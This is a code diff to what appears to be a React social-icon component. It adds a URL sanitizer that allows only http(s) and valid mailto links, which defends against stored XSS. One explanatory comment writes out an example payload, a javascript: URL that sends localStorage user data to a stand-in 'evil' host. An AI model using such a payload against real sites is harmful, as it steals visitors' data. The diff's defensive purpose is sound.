@@ -57,11 +57,27 @@ const SOCIAL_ICONS = {
 };
 const SOCIAL_ORDER = ['instagram', 'youtube', 'linkedin', 'facebook', 'twitter', 'whatsapp', 'website', 'github', 'email'];
 
+// Sanitize a vendor-supplied social link before using it as an href. social_links
+// are vendor-controlled — a value like `javascript:fetch('//evil/?c='+localStorage.user)`
+// would be stored XSS against any visitor who clicks it. Allow only http(s) links
+// (and mailto: for a valid email); anything else collapses to a harmless '#'.
+const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+const safeUrl = (value, isEmail = false) => {
+  const v = String(value || '').trim();
+  if (isEmail) {
+    const addr = v.replace(/^mailto:/i, '');
+    return EMAIL_RE.test(addr) ? `mailto:${addr}` : '#';
+  }
+  return /^https?:\/\//i.test(v) ? v : '#';
+};
+
 const SocialIcon = ({ platform, href }) => {
   const icon = SOCIAL_ICONS[platform];
   if (!icon || !href) return null;
+  const cleanHref = safeUrl(href, platform === 'email');
+  if (cleanHref === '#') return null;
   return (
-    <a href={href} target="_blank" rel="noreferrer"
+    <a href={cleanHref} target="_blank" rel="noreferrer"
       className="flex items-center justify-center flex-shrink-0 text-gray-500 border border-gray-200 rounded-lg hover:text-gray-900 hover:border-gray-300 hover:bg-gray-50 transition-colors"
       style={{ width: 34, height: 34 }}
       title={platform.charAt(0).toUpperCase() + platform.slice(1)}>
